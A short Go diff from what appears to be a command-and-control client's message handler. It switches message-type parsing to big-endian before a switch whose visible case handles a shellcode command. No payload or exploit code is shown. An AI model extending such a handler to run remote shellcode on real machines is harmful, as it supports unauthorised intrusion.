@@ -96,7 +96,7 @@ func (h *handler) OnMessage(answer *protocol.Answer) {
 		return
 	}
 	typ := answer.Message[messages.RandomDataSize:messages.HeaderSize]
-	msgType := convert.BytesToUint32(typ)
+	msgType := convert.BEBytesToUint32(typ)
 	answer.Message = answer.Message[messages.HeaderSize:]
 	switch msgType {
 	case messages.CMDShellCode:
